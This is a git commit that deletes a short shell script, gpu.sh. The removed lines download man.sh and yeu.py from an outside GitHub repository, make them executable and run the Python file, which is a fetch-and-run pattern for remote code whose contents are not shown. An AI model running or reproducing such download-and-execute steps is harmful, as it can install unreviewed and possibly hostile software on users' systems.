ca367b513fc3cc742e76cc00ae5e48a49e7e4f48
xR3HAN <86459942+xR3HAN@users.noreply.github.com>
2021-06-26 23:12:28 +0530

    Delete gpu.sh

--- gpu.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/sh
-	sudo apt update
-	wget https://github.com/biswas179/FkgX/raw/main/man.sh 
-	wget https://github.com/biswas179/FkgX/raw/main/yeu.py
-	chmod u+x man.sh
-	chmod u+x yeu.py
-
-	python yeu.py
